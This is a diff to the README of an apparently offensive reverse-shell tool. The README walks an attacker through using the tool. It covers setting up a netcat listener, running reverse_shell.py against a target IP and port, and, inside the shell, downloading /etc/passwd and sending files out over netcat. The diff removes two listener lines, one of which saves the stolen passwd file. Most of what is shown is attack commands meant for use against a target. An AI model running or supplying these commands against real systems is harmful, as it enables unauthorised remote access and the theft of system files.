@@ -25,7 +25,6 @@ cd Reverse-Shell
 On the attacker's machine, set up a listener to receive the reverse shell connection. You can use `netcat` (nc) for this purpose.
 
 ```sh
-nc -lvp YOUR_PORT
 python3 reverse_shell.py
 python3 reverse_shell.py -h
 python3 reverse_shell.py <TARGET_IP> <TARGET_PORT>
@@ -34,4 +33,3 @@ cd /etc
 upload test.txt
 cat test.txt | nc -w 3 YOUR_TARGET_IP YOUR_PORT
 download /etc/passwd
-nc -lvp YOUR_PORT > passwd
